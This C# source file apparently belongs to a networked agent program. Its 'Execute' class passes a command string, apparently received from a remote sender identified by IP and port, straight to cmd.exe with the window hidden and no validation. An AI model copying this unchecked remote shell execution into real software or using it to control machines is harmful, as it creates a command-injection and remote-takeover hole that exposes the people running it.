using System;
using System.Diagnostics;

namespace Agent.Commands
{
    public class Execute : Command
    {
        public static string MyExecuteCommand = "Agent.exe";

        public string command { get; set; }

        public override void ExecuteCommand()
        {
            ProcessStartInfo ProcessInfo;
            Process Process;

            string toDir = "cd " + "received/" + sourceIp + "_" + sourcePort + "&";
            Console.WriteLine("Executing " + toDir + command);

            ProcessInfo = new ProcessStartInfo("cmd.exe", "/K " + toDir + command);
            ProcessInfo.CreateNoWindow = true;
            ProcessInfo.UseShellExecute = true;

            Process = Process.Start(ProcessInfo);
        }
    }
}
